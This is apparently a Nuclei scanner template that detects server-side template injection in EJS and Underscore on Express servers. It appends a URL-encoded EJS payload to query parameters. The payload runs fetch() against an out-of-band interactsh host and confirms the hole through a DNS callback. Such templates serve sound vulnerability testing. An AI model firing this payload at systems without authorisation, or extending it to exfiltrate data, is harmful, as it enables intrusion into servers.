id: ejs-underscore-oob

info:
  name: Ejs AND Underscore - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: unknown
  reference:
    - https://ejs.co/
    - https://underscorejs.org/
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: ssti,dast,oast,oob

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '%3C%25%3Dfunction%28%29%7Bfetch%28%22http%3A%2F%2F{{interactsh-url}}%22%29%7D%28%29%25%3E%0A'

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: word
        part: x_powered_by
        words:
          - "Express"